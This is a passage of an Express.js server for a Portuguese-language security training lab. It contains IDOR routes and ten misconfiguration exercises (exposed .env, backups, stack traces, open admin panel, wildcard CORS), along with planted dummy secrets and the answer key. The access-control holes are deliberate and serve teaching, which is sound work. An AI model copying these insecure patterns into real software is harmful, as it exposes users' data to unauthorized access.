        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 9. PEDIDOS — IDOR via parâmetro na query string em vez de parâmetro na URL (Teste 9)
app.get('/idor/:sala/pedidos', async (req, res) => {
    const { sala } = req.params;
    const usuarioNumero = parseInt(req.query.usuario_numero, 10) || 1;
    try {
        const perfilR = await pool.query('SELECT nome FROM idor_perfis WHERE sala=$1 AND numero=$2', [sala, usuarioNumero]);
        const nomeUsuario = perfilR.rows[0] ? perfilR.rows[0].nome : `usuário #${usuarioNumero}`;
        const r = await pool.query('SELECT * FROM idor_pedidos WHERE sala=$1 AND perfil_numero=$2 ORDER BY numero', [sala, usuarioNumero]);
        const linhas = r.rows.map(p => `
            <tr>
                <td style="padding:8px; border:1px solid #ddd;">${p.numero}</td>
                <td style="padding:8px; border:1px solid #ddd;">${escapeHtml(p.item)}</td>
                <td style="padding:8px; border:1px solid #ddd;">R$ ${p.valor}</td>
            </tr>
        `).join('');
        const html = `
            <h2>📦 Histórico de Pedidos — Lab ${sala}</h2>
            <p style="color:#666;">Mostrando os pedidos de <strong>${escapeHtml(nomeUsuario)}</strong> (perfil #${usuarioNumero}), só porque o número está disponível na própria URL (<code>?usuario_numero=${usuarioNumero}</code>).</p>
            <table style="width:100%; border-collapse:collapse;">
                <thead>
                    <tr style="background:#f2f2f2;">
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">#</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Item</th>
                        <th style="padding:8px; border:1px solid #ddd; text-align:left;">Valor</th>
                    </tr>
                </thead>
                <tbody>${linhas || '<tr><td colspan="3" style="padding:15px; text-align:center; color:#999;">Nenhum pedido encontrado.</td></tr>'}</tbody>
            </table>
        `;
        res.send(paginaIdor(sala, 'Pedidos', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 10. MENSAGENS PRIVADAS (Teste 10)
app.get('/idor/:sala/mensagem/:numero', async (req, res) => {
    const { sala } = req.params;
    const numero = parseInt(req.params.numero, 10);
    if (Number.isNaN(numero)) return res.status(400).send(paginaIdor(sala, 'Número inválido', '<h2>❌ Número de mensagem inválido</h2>'));

    try {
        const r = await pool.query('SELECT * FROM idor_mensagens WHERE sala=$1 AND numero=$2', [sala, numero]);
        if (r.rows.length === 0) return res.status(404).send(paginaIdor(sala, 'Não encontrada', '<h2>❌ Mensagem não encontrada</h2>'));
        const m = r.rows[0];
        const html = `
            <h2>✉️ Conversa Privada #${m.numero} — Lab ${sala}</h2>
            <p style="color:#666;">Este deveria ser um canal privado entre um usuário específico e o suporte.</p>
            <div style="background:#f8f9fa; border:1px solid #ddd; border-radius:4px; padding:20px;">
                <p>${escapeHtml(m.conteudo)}</p>
            </div>
        `;
        res.send(paginaIdor(sala, 'Mensagem Privada', html));
    } catch (error) {
        res.status(500).send(paginaIdor(sala, 'Erro', `<p style="color:red;">❌ Erro: ${escapeHtml(error.message)}</p>`));
    }
});

// 10.5 PROGRESSO DA SALA — o dashboard consulta isto ao carregar a página em vez de usar
//      localStorage, para que o ✅ exibido seja sempre o que está gravado no banco.
app.get('/idor/:sala/progresso', async (req, res) => {
    const { sala } = req.params;
    try {
        const r = await pool.query('SELECT teste_id FROM idor_progresso WHERE sala=$1', [sala]);
        res.json({ concluidos: r.rows.map(row => row.teste_id) });
    } catch (error) {
        res.status(500).json({ concluidos: [], erro: error.message });
    }
});

// 11. VALIDAÇÃO DAS RESPOSTAS — compara o que o aluno encontrou com o valor correto guardado no servidor
//     e, se acertou, registra a conclusão no banco (idor_progresso) para o painel do professor ver.
app.post('/idor/:sala/validar', async (req, res) => {
    const { sala } = req.params;
    const { testeId, resposta } = req.body;
    const esperado = (RESPOSTAS_IDOR[sala] || {})[testeId];
    if (!esperado) return res.status(400).json({ correto: false, erro: 'Teste desconhecido' });

    const correto = normalizarRespostaIdor(resposta) === normalizarRespostaIdor(esperado);

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO idor_progresso (sala, teste_id) VALUES ($1, $2) ON CONFLICT (sala, teste_id) DO UPDATE SET concluido_em = NOW()',
                [sala, testeId]
            );
        } catch (error) {
            console.error('Erro ao registrar progresso de IDOR:', error.message);
        }
    }

    res.json({ correto });
});

// 12. RESET DOS DADOS DE UMA SALA (restaura perfis, comprovantes, faturas, pedidos, chamados e mensagens)
app.post('/idor/:sala/reset', async (req, res) => {
    const { sala } = req.params;
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        await client.query('DELETE FROM idor_perfis WHERE sala=$1', [sala]);
        for (const p of SEED_IDOR_PERFIS[sala]) {
            await client.query(
                'INSERT INTO idor_perfis (sala, numero, nome, email, telefone, cargo, salario, cpf, bio, papel, token) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)',
                [sala, p.numero, p.nome, p.email, p.telefone, p.cargo, p.salario, p.cpf, p.bio, p.papel, p.token]
            );
        }

        await client.query('DELETE FROM idor_comprovantes WHERE sala=$1', [sala]);
        for (const c of SEED_IDOR_COMPROVANTES[sala]) {
            await client.query('INSERT INTO idor_comprovantes (sala, numero, perfil_numero, valor, descricao) VALUES ($1,$2,$3,$4,$5)', [sala, c.numero, c.perfil_numero, c.valor, c.descricao]);
        }

        await client.query('DELETE FROM idor_faturas WHERE sala=$1', [sala]);
        for (const f of SEED_IDOR_FATURAS[sala]) {
            await client.query('INSERT INTO idor_faturas (sala, numero, perfil_numero, valor, descricao) VALUES ($1,$2,$3,$4,$5)', [sala, f.numero, f.perfil_numero, f.valor, f.descricao]);
        }

        await client.query('DELETE FROM idor_pedidos WHERE sala=$1', [sala]);
        for (const p of SEED_IDOR_PEDIDOS[sala]) {
            await client.query('INSERT INTO idor_pedidos (sala, numero, perfil_numero, item, valor) VALUES ($1,$2,$3,$4,$5)', [sala, p.numero, p.perfil_numero, p.item, p.valor]);
        }

        await client.query('DELETE FROM idor_chamados WHERE sala=$1', [sala]);
        for (const c of SEED_IDOR_CHAMADOS[sala]) {
            await client.query('INSERT INTO idor_chamados (sala, numero, perfil_numero, assunto, mensagem) VALUES ($1,$2,$3,$4,$5)', [sala, c.numero, c.perfil_numero, c.assunto, c.mensagem]);
        }

        await client.query('DELETE FROM idor_mensagens WHERE sala=$1', [sala]);
        for (const m of SEED_IDOR_MENSAGENS[sala]) {
            await client.query('INSERT INTO idor_mensagens (sala, numero, perfil_numero, conteudo) VALUES ($1,$2,$3,$4)', [sala, m.numero, m.perfil_numero, m.conteudo]);
        }

        // O reset de dados também zera o progresso: depois de restaurar tudo, os exercícios
        // marcados como concluídos não fariam mais sentido (a "prova" do ataque desapareceu).
        await client.query('DELETE FROM idor_progresso WHERE sala=$1', [sala]);

        await client.query('COMMIT');
        res.json({ sucesso: true, mensagem: `✅ Dados e progresso do Lab ${sala} de IDOR resetados com sucesso!` });
    } catch (error) {
        await client.query('ROLLBACK');
        res.status(500).json({ sucesso: false, erro: error.message });
    } finally {
        client.release();
    }
});

// ============================================================================
// LABORATÓRIO DE MISCONFIGURATION + DADOS SENSÍVEIS
// ============================================================================
// Diferente do lab de IDOR, aqui nada é editado/excluído pelo aluno — cada
// exercício expõe um conteúdo fixo (arquivo, painel, endpoint) que nunca
// deveria estar acessível. Por isso não há tabelas de conteúdo: só uma
// tabela de progresso (misconfig_progresso), criada em create_table_misconfig.sql.
// Os valores abaixo são DIFERENTES entre sala 1 e sala 2 de propósito, para que
// a resposta certa de um exercício nunca seja a mesma nas duas salas.
const CONTEUDO_MISCONFIG = {
    '1': {
        backupSenha: 'Adm1n_2024_R3v',
        envApiKey: 'pk_live_8f2k9XQ4mZ',
        relatorioFaturamento: 'R$ 482.350,00',
        stacktraceSenha: 'R3l_2024!',
        painelCofreCodigo: 'COFRE-7741-A',
        comentarioSenhaQaTemp: 'Temp#2024xx',
        statusChaveSessao: 'SESS-INT-99821',
        diagnosticoBuildHeader: 'build-8821-stage',
        csvVipCodigo: 'VIP-CODE-3391',
        apiNotaInterna: 'PED-CONF-5512'
    },
    '2': {
        backupSenha: 'Root_S3gur4_99',
        envApiKey: 'pk_live_3jR7vLpN2y',
        relatorioFaturamento: 'R$ 597.120,00',
        stacktraceSenha: 'Fin_2024#',
        painelCofreCodigo: 'COFRE-5520-B',
        comentarioSenhaQaTemp: 'Temp#2024yy',
        statusChaveSessao: 'SESS-INT-44310',
        diagnosticoBuildHeader: 'build-4470-stage',
        csvVipCodigo: 'VIP-CODE-7765',
        apiNotaInterna: 'PED-CONF-9087'
    }
};

// As 10 lições do laboratório, da mais fácil (digitar uma URL) até a mais conceitual
// (entender o que um cabeçalho de CORS aberto demais permite a um site malicioso).
const testesMisconfig = [
    {
        id: 'misconfig1',
        nome: '1️⃣ Backup de Banco Exposto (Arquivo Esquecido no Servidor)',
        oQueAlunoFaz: 'Acesse o painel em /misconfig/SALA e veja que não existe nenhum link óbvio para arquivos de backup.',
        acaoDoAtaque: 'Mesmo assim, digite diretamente na barra de endereço: /misconfig/SALA/backup-loja.sql — um arquivo de backup do banco de dados que ficou esquecido na pasta pública do servidor.',
        licao: 'Backups de banco de dados nunca deveriam ficar acessíveis numa pasta pública do servidor. É um erro de configuração (misconfiguration) clássico: alguém gerou o arquivo para uso interno e esqueceu de removê-lo ou de restringir o acesso.',
        pergunta: 'Qual é a senha do administrador encontrada dentro do arquivo de backup?'
    },
    {
        id: 'misconfig2',
        nome: '2️⃣ Arquivo .env Exposto (Credenciais de Configuração)',
        oQueAlunoFaz: 'Sistemas Node.js costumam guardar credenciais sensíveis (chaves de API, senhas de banco) num arquivo chamado .env, que nunca deveria ser enviado pelo servidor.',
        acaoDoAtaque: 'Acesse /misconfig/SALA/.env diretamente no navegador e veja que o servidor devolve o conteúdo desse arquivo de configuração, ao invés de bloquear o acesso.',
        licao: 'Arquivos de configuração com segredos (.env, config.json, etc.) precisam estar fora da pasta pública do site e bloqueados no servidor. Se um atacante consegue baixar o .env, ele ganha acesso a todas as chaves e senhas do sistema de uma vez.',
        pergunta: 'Qual é o valor da variável API_KEY_PAGAMENTO exposta no arquivo .env?'
    },
    {
        id: 'misconfig3',
        nome: '3️⃣ Listagem de Diretório Habilitada',
        oQueAlunoFaz: 'Clique no atalho "Pasta de Uploads" no painel e observe que o servidor mostra a lista de TODOS os arquivos da pasta, como se fosse um gerenciador de arquivos — algo que nunca deveria estar habilitado em produção.',
        acaoDoAtaque: 'Clique no arquivo "relatorio-financeiro-2024.txt" que aparece na listagem e leia seu conteúdo, mesmo sem ter nenhum link para ele em nenhuma outra tela do sistema.',
        licao: '"Directory listing" habilitado expõe a estrutura inteira de arquivos do servidor para qualquer visitante — inclusive arquivos que ninguém pretendia divulgar, só porque alguém esqueceu de desativar essa opção no servidor web.',
        pergunta: 'Qual é o valor do faturamento confidencial do trimestre informado no relatório?'
    },
    {
        id: 'misconfig4',
        nome: '4️⃣ Mensagem de Erro Detalhada (Stack Trace)',
        oQueAlunoFaz: 'Acesse /misconfig/SALA/relatorio/7 (um número de relatório válido) e veja a tela normal de relatório.',
        acaoDoAtaque: 'Agora acesse /misconfig/SALA/relatorio/abc (um valor que não é número, para forçar um erro). Em vez de mostrar uma mensagem genérica, o servidor devolve o erro técnico completo (stack trace), revelando caminhos internos do servidor e até uma string de conexão com o banco de dados.',
        licao: 'Em produção, o servidor nunca deveria devolver o erro técnico bruto para o usuário — isso é trabalho de log interno, não de resposta HTTP. Mensagens de erro detalhadas entregam de bandeja informações que ajudam um atacante a entender e invadir o sistema.',
        pergunta: 'Qual é a senha do usuário "relatorios_user" revelada na string de conexão dentro do erro?'
    },
    {
        id: 'misconfig5',
        nome: '5️⃣ Painel Administrativo Sem Autenticação',
        oQueAlunoFaz: 'Repare que nenhum menu do laboratório linka para uma área administrativa interna.',
        acaoDoAtaque: 'Mesmo assim, acesse diretamente /misconfig/SALA/painel-interno. O painel administrativo da empresa abre sem pedir login nenhum, mostrando informações que deveriam ser restritas à equipe interna.',
        licao: 'Uma URL "escondida" não é controle de acesso — é só "segurança por obscuridade", que não funciona. Toda área administrativa precisa de autenticação real verificada no servidor, não apenas a ausência de um link visível.',
        pergunta: 'Qual é o código de acesso ao cofre de documentos revelado no painel interno?'
    },
    {
        id: 'misconfig6',
        nome: '6️⃣ Credenciais Esquecidas em Comentário no Código-Fonte',
        oQueAlunoFaz: 'Clique no atalho "Contato" no painel normalmente, como qualquer visitante do site faria.',
        acaoDoAtaque: 'Clique com o botão direito na página e escolha "Ver código-fonte da página" (ou aperte Ctrl+U). Procure por um comentário HTML deixado pela equipe de desenvolvimento, esquecido antes de colocar o site em produção.',
        licao: 'Comentários no HTML são enviados ao navegador de qualquer visitante e podem ser lidos por qualquer pessoa — nunca deixe senhas, credenciais de teste ou anotações internas em comentários de código que vai para produção.',
        pergunta: 'Qual é a senha do usuário de teste "qa_temp" encontrada no comentário?'
    },
    {
        id: 'misconfig7',
        nome: '7️⃣ Endpoint de Diagnóstico Expõe Dados Internos',
        oQueAlunoFaz: 'Sistemas costumam ter rotas de diagnóstico/health-check para monitoramento automático (ex.: verificar se o servidor está de pé).',
        acaoDoAtaque: 'Clique no atalho "Status / Debug" no painel e veja que o endpoint devolve, em JSON, informações internas que vão muito além de "o servidor está ligado": ambiente, endereço de servidor interno e uma chave de sessão interna.',
        licao: 'Endpoints de diagnóstico devem responder o mínimo necessário (ex.: apenas "ok"). Quando devolvem detalhes internos da infraestrutura, eles se tornam uma fonte gratuita de informação para quem está mapeando o sistema antes de um ataque.',
        pergunta: 'Qual é o valor da "chave_sessao_interna" mostrada no JSON de /misconfig/SALA/status?'
    },
    {
        id: 'misconfig8',
        nome: '8️⃣ Cabeçalho de Resposta Revela Informação de Build Interna',
        oQueAlunoFaz: 'Clique no atalho "Diagnóstico" no painel — a própria página mostra, na tela, quais cabeçalhos (headers) o servidor enviou na resposta dela mesma.',
        acaoDoAtaque: 'Observe entre os cabeçalhos listados um chamado X-Internal-Build, com um valor que não deveria sair do ambiente interno de desenvolvimento.',
        licao: 'Cabeçalhos HTTP personalizados criados para debug interno (versão de build, nome de servidor, caminho interno) às vezes são deixados ativos em produção sem querer. Qualquer cabeçalho de resposta é visível para qualquer visitante — não é um canal privado.',
        pergunta: 'Qual é o valor do cabeçalho X-Internal-Build mostrado na página de diagnóstico?'
    },
    {
        id: 'misconfig9',
        nome: '9️⃣ Exportação Pública de Dados Sensíveis (CSV sem Autenticação)',
        oQueAlunoFaz: 'Note que não existe nenhum botão "Exportar clientes" em nenhuma tela visível do laboratório.',
        acaoDoAtaque: 'Acesse diretamente /misconfig/SALA/exportar/clientes.csv. O servidor devolve um arquivo CSV completo com dados de clientes (CPF, e-mail, cartão parcialmente mascarado), sem exigir login nenhum.',
        licao: 'Funcionalidades de exportação de dados (relatórios, planilhas, CSVs) costumam ser construídas "por dentro" do sistema, pensando só em quem já está logado no painel — e acabam esquecidas sem nenhuma verificação de permissão quando alguém descobre a URL direta.',
        pergunta: 'Qual é o código da observação interna anotada ao lado do cliente marcado como VIP no CSV?'
    },
    {
        id: 'misconfig10',
        nome: '🔟 CORS Mal Configurado — Qualquer Site Pode Ler os Dados',
        oQueAlunoFaz: 'Acesse /misconfig/SALA/api/pedidos-internos e veja que essa API interna devolve, em JSON, pedidos e uma nota interna confidencial — sem exigir login.',
        acaoDoAtaque: 'Observe, na própria tela, que o cabeçalho de resposta Access-Control-Allow-Origin está configurado como "*" (asterisco). Isso significa que essa API aceita ser chamada por JavaScript rodando em QUALQUER site da internet, não apenas pelo nosso laboratório — um site malicioso poderia embutir essa chamada e roubar esses dados de quem estivesse com a sessão ativa.',
        licao: 'CORS (Cross-Origin Resource Sharing) existe para o navegador controlar quem pode ler a resposta de uma API por JavaScript de outro site. Usar Access-Control-Allow-Origin: "*" numa API que devolve dados sensíveis anula essa proteção por completo — é como deixar a porta dos fundos aberta para o mundo inteiro, achando que ninguém vai notar.',
        pergunta: 'Qual é o código da "nota_interna" confidencial revelada no JSON da API de pedidos internos?'
    }
];

// Respostas corretas de cada desafio — nunca são enviadas ao navegador, só comparadas no servidor.
const RESPOSTAS_MISCONFIG = {
    '1': {
        misconfig1: CONTEUDO_MISCONFIG['1'].backupSenha,
        misconfig2: CONTEUDO_MISCONFIG['1'].envApiKey,
        misconfig3: CONTEUDO_MISCONFIG['1'].relatorioFaturamento,
        misconfig4: CONTEUDO_MISCONFIG['1'].stacktraceSenha,
        misconfig5: CONTEUDO_MISCONFIG['1'].painelCofreCodigo,
        misconfig6: CONTEUDO_MISCONFIG['1'].comentarioSenhaQaTemp,
        misconfig7: CONTEUDO_MISCONFIG['1'].statusChaveSessao,
        misconfig8: CONTEUDO_MISCONFIG['1'].diagnosticoBuildHeader,
        misconfig9: CONTEUDO_MISCONFIG['1'].csvVipCodigo,
        misconfig10: CONTEUDO_MISCONFIG['1'].apiNotaInterna
    },
    '2': {
        misconfig1: CONTEUDO_MISCONFIG['2'].backupSenha,
        misconfig2: CONTEUDO_MISCONFIG['2'].envApiKey,
        misconfig3: CONTEUDO_MISCONFIG['2'].relatorioFaturamento,
        misconfig4: CONTEUDO_MISCONFIG['2'].stacktraceSenha,
        misconfig5: CONTEUDO_MISCONFIG['2'].painelCofreCodigo,
        misconfig6: CONTEUDO_MISCONFIG['2'].comentarioSenhaQaTemp,
        misconfig7: CONTEUDO_MISCONFIG['2'].statusChaveSessao,
        misconfig8: CONTEUDO_MISCONFIG['2'].diagnosticoBuildHeader,
        misconfig9: CONTEUDO_MISCONFIG['2'].csvVipCodigo,
        misconfig10: CONTEUDO_MISCONFIG['2'].apiNotaInterna
    }
};

// Compara respostas ignorando acentos, maiúsculas/minúsculas e pontuação/espaçamento.
function normalizarRespostaMisconfig(s) {
    return String(s || '')
        .normalize('NFD').replace(/[̀-ͯ]/g, '')
        .toLowerCase()
        .replace(/[^a-z0-9]/g, '');
}

function renderMenuMisconfig(sala) {
    let menu = '';
    testesMisconfig.forEach(teste => {
        const oQueAlunoFaz = teste.oQueAlunoFaz.replace(/SALA/g, sala);
        const acaoDoAtaque = teste.acaoDoAtaque.replace(/SALA/g, sala);
        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTesteMisconfig('${teste.id}')">
                    <strong style="font-size:13px;" id="titulo-${teste.id}">${escapeHtml(teste.nome)}</strong>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    <p style="margin:6px 0; color:#333; font-size:12px;"><strong>📍 O que o aluno faz:</strong> ${escapeHtml(oQueAlunoFaz)}</p>
                    <p style="margin:6px 0; color:#0b5d57; font-size:12px;"><strong>⚔️ Ação do ataque:</strong> ${escapeHtml(acaoDoAtaque)}</p>
                    <p style="margin:6px 0; color:#155724; font-size:12px;"><strong>🎓 Lição:</strong> ${escapeHtml(teste.licao)}</p>
                    <div style="background:white; border:1px solid #0F766E; border-radius:4px; padding:10px; margin-top:10px;">
                        <p style="margin:0 0 6px 0; font-size:12px; font-weight:bold; color:#333;">${escapeHtml(teste.pergunta)}</p>
                        <input type="text" id="resposta-${teste.id}" placeholder="Cole aqui a resposta encontrada..." style="width:100%; padding:8px; margin-bottom:8px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; font-size:12px;">
                        <button onclick="validarTesteMisconfig('${teste.id}')" style="width:100%; padding:8px; background:#0F766E; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:12px;">✅ Validar Resposta</button>
                        <p id="feedback-${teste.id}" style="margin:8px 0 0 0; font-size:11px;"></p>
                    </div>
                </div>
            </div>
        `;
    });
    return menu;
}

const sidebarStyleMisconfig = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; background: white; }
    .container { display: flex; min-height: 100vh; }
    .sidebar { width: 340px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
    .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
    .sidebar h2 { margin-top: 0; margin-bottom: 6px; color: #333; font-size: 16px; }
    .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
    .teste-item { margin: 8px 0; }
    .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
    .teste-link.active { background:#0F766E; color:white; border:2px solid #0B5D57; }
    .teste-link.concluido { border-left: 4px solid #28a745; }
    .teste-panel { display:none; background:#e9f9f7; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #0F766E; }
    .teste-panel.open { display:block; }
    .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#6c757d; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; }
    .nav-link { display:block; text-align:center; padding:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px; margin-top:10px; font-size: 13px; }
`;

const scriptAccordionMisconfig = `
    let testeAbertoMisconfig = null;
    function toggleTesteMisconfig(id) {
        const painelNovo = document.getElementById('panel-' + id);
        const linkNovo = document.getElementById('link-' + id);
        const reabrindoMesmo = testeAbertoMisconfig === id;

        if (testeAbertoMisconfig) {
            document.getElementById('panel-' + testeAbertoMisconfig).classList.remove('open');
            document.getElementById('link-' + testeAbertoMisconfig).classList.remove('active');
        }

        if (reabrindoMesmo) {
            testeAbertoMisconfig = null;
        } else {
            painelNovo.classList.add('open');
            linkNovo.classList.add('active');
            testeAbertoMisconfig = id;
        }
    }

    function atualizarContadorMisconfig(total) {
        const contador = document.getElementById('contador-progresso');
        if (contador) contador.textContent = total + ' / 10 concluídos';
    }

    function marcarConcluidoMisconfig(id) {
        const link = document.getElementById('link-' + id);
        const titulo = document.getElementById('titulo-' + id);
        if (link) link.classList.add('concluido');
        if (titulo && titulo.textContent.indexOf('✅') === -1) titulo.textContent = '✅ ' + titulo.textContent;
    }

    function desmarcarTodosMisconfig() {
        document.querySelectorAll('.teste-link.concluido').forEach(function(link) {
            link.classList.remove('concluido');
        });
        document.querySelectorAll('[id^="titulo-misconfig"]').forEach(function(titulo) {
            titulo.textContent = titulo.textContent.replace('✅ ', '');
        });
    }

    async function carregarProgressoDoServidorMisconfig(sala) {
        try {
            const response = await fetch('/misconfig/' + sala + '/progresso');
            const resultado = await response.json();
            desmarcarTodosMisconfig();
            (resultado.concluidos || []).forEach(marcarConcluidoMisconfig);
            atualizarContadorMisconfig((resultado.concluidos || []).length);
        } catch (err) {
            console.error('Erro ao carregar progresso:', err.message);
        }
    }

    async function validarTesteMisconfig(id) {
        const sala = window.SALA_ATUAL;
        const input = document.getElementById('resposta-' + id);
        const feedback = document.getElementById('feedback-' + id);
        const resposta = input.value;
        try {
            const response = await fetch('/misconfig/' + sala + '/validar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ testeId: id, resposta: resposta })
            });
            const resultado = await response.json();
            if (resultado.correto) {
                feedback.textContent = '✅ Correto! Exercício concluído.';
                feedback.style.color = '#28a745';
                await carregarProgressoDoServidorMisconfig(sala);
            } else {
                feedback.textContent = '❌ Ainda não é isso. Revise os passos do ataque e tente de novo.';
                feedback.style.color = '#dc3545';
            }
        } catch (err) {
            feedback.textContent = '❌ Erro ao validar: ' + err.message;
            feedback.style.color = '#dc3545';
        }
    }

    async function resetarProgressoMisconfig(sala) {
        if (!confirm('⚠️ Isso vai zerar o progresso dos 10 exercícios do Lab ' + sala + ' de Misconfiguration. Continuar?')) {
            return;
        }
        try {
            const response = await fetch('/misconfig/' + sala + '/reset', { method: 'POST' });
            const resultado = await response.json();
            alert(resultado.mensagem || resultado.erro);
            window.location.reload();
        } catch (err) {
            alert('❌ Erro ao resetar: ' + err.message);
        }
    }
`;

// Envolve o conteúdo de cada tela do lab no mesmo layout simples usado no lab de IDOR
function paginaMisconfig(sala, titulo, conteudoHtml) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>${escapeHtml(titulo)} - Lab Misconfiguration ${sala}</title>
        </head>
        <body style="font-family: sans-serif; max-width: 800px; margin: 40px auto; padding: 20px;">
            ${conteudoHtml}
            <br>
            <a href="/misconfig/${sala}" style="color:#0F766E; text-decoration:none;">← Voltar para o Laboratório</a>
        </body>
        </html>
    `;
}

// Mesmas credenciais de turma usadas no lab de IDOR (login por sala, não por aluno).
const CREDENCIAIS_MISCONFIG = {
    'sala-a': { senha: 'a-sala', sala: '1', nomeExibicao: 'Sala A' },
    'sala-b': { senha: 'sala-b', sala: '2', nomeExibicao: 'Sala B' }
};

// 0. LOGIN DA SALA — página estática, ver public/misconfig-login.html
app.get('/misconfig', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'misconfig-login.html'));
});

app.post('/misconfig/login', (req, res) => {
    const usuario = String(req.body.usuario || '').trim().toLowerCase();
    const senha = String(req.body.senha || '');
    const conta = CREDENCIAIS_MISCONFIG[usuario];

    if (!conta || conta.senha !== senha) {
        return res.redirect('/misconfig?erro=1');
    }

    req.session.misconfigSala = conta.sala;
    req.session.misconfigNomeExibicao = conta.nomeExibicao;
    res.redirect(`/misconfig/${conta.sala}`);
});

app.get('/misconfig/logout', (req, res) => {
    req.session.misconfigSala = null;
    req.session.misconfigNomeExibicao = null;
    res.redirect('/misconfig');
});

function exigirLoginMisconfig(req, res, next) {
    if (req.session.misconfigSala && req.session.misconfigSala === req.params.sala) {
        return next();
    }
    res.redirect('/misconfig');
}

// PAINEL OCULTO DO PROFESSOR — precisa ser registrado ANTES de "/misconfig/:sala" abaixo,
// pelo mesmo motivo do lab de IDOR (senão "painel-professor" seria tratado como valor de :sala).
// Endpoint JSON usado pelo polling automático do painel (não recarrega a página inteira,
// só busca o estado atual a cada poucos segundos e atualiza as células na tela).
app.get('/misconfig/painel-professor/dados', async (req, res) => {
    try {
        const r = await pool.query('SELECT sala, teste_id, concluido_em FROM misconfig_progresso');
        const concluidos = {};
        r.rows.forEach(row => {
            concluidos[`${row.sala}:${row.teste_id}`] = row.concluido_em;
        });
        res.json({ concluidos });
    } catch (error) {
        res.status(500).json({ erro: error.message });
    }
});

app.get('/misconfig/painel-professor', async (req, res) => {
    try {
        const r = await pool.query('SELECT sala, teste_id, concluido_em FROM misconfig_progresso');
        const concluidos = {};
        r.rows.forEach(row => {
            concluidos[`${row.sala}:${row.teste_id}`] = row.concluido_em;
        });

        const celulaSala = (testeId, salaId) => {
            const concluidoEm = concluidos[`${salaId}:${testeId}`];
            if (concluidoEm) {
                return `<td id="cel-${salaId}-${testeId}" style="padding:10px; border:1px solid #ddd; text-align:center; background:#d4edda;">✅<br><small style="color:#666;">${new Date(concluidoEm).toLocaleString('pt-BR')}</small></td>`;
            }
            return `<td id="cel-${salaId}-${testeId}" style="padding:10px; border:1px solid #ddd; text-align:center; background:#f8d7da; color:#721c24;">❌</td>`;
        };

        const linhas = testesMisconfig.map(teste => `
                <tr>
                    <td style="padding:10px; border:1px solid #ddd;">${escapeHtml(teste.nome)}</td>
                    ${celulaSala(teste.id, '1')}
                    ${celulaSala(teste.id, '2')}
                </tr>
            `).join('');

        const totalSalaA = Object.keys(concluidos).filter(k => k.startsWith('1:')).length;
        const totalSalaB = Object.keys(concluidos).filter(k => k.startsWith('2:')).length;

        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>Painel do Professor - Lab Misconfiguration</title>
            </head>
            <body style="font-family: sans-serif; max-width: 900px; margin: 40px auto; padding: 20px;">
                <h2>🧑‍🏫 Painel do Professor — Progresso do Lab de Misconfiguration</h2>
                <p style="color:#666;">Esta página não tem link em nenhum menu — só quem conhece o endereço acessa. <span id="status-auto-atualizar" style="color:#0F766E;">🟢 Atualizando automaticamente...</span></p>

                <div style="display:flex; gap:15px; margin-bottom:20px;">
                    <div style="flex:1; background:#e9f9f7; border-left:4px solid #0F766E; padding:15px; border-radius:4px;">
                        <strong>Sala A</strong> — <span id="contador-sala-1">${totalSalaA}</span> / 10 concluídos
                    </div>
                    <div style="flex:1; background:#e9f9f7; border-left:4px solid #0F766E; padding:15px; border-radius:4px;">
                        <strong>Sala B</strong> — <span id="contador-sala-2">${totalSalaB}</span> / 10 concluídos
                    </div>
                </div>

                <table style="width:100%; border-collapse:collapse;">
                    <thead>
                        <tr style="background:#f2f2f2;">
                            <th style="padding:10px; border:1px solid #ddd; text-align:left;">Exercício</th>
                            <th style="padding:10px; border:1px solid #ddd;">Sala A</th>
                            <th style="padding:10px; border:1px solid #ddd;">Sala B</th>
                        </tr>
                    </thead>
                    <tbody>${linhas}</tbody>
                </table>

                <div style="margin-top:25px; display:flex; gap:10px;">
                    <form action="/misconfig/painel-professor/limpar/1" method="POST" onsubmit="return confirm('Limpar todo o progresso registrado da Sala A?');">
                        <button type="submit" style="padding:10px 18px; background:#6c757d; color:white; border:none; border-radius:4px; cursor:pointer;">🧹 Limpar progresso da Sala A</button>
                    </form>
                    <form action="/misconfig/painel-professor/limpar/2" method="POST" onsubmit="return confirm('Limpar todo o progresso registrado da Sala B?');">
                        <button type="submit" style="padding:10px 18px; background:#6c757d; color:white; border:none; border-radius:4px; cursor:pointer;">🧹 Limpar progresso da Sala B</button>
                    </form>
                </div>

                <script>
                    // Busca o progresso atual a cada 5 segundos e atualiza só as células que mudaram,
                    // sem recarregar a página inteira — assim o professor pode deixar isso aberto
                    // num projetor durante a aula e ver as respostas dos alunos chegando em tempo real.
                    const TESTES_IDS = ${JSON.stringify(testesMisconfig.map(t => t.id))};

                    async function atualizarPainelAutomaticamente() {
                        try {
                            const response = await fetch('/misconfig/painel-professor/dados');
                            const resultado = await response.json();
                            const concluidos = resultado.concluidos || {};

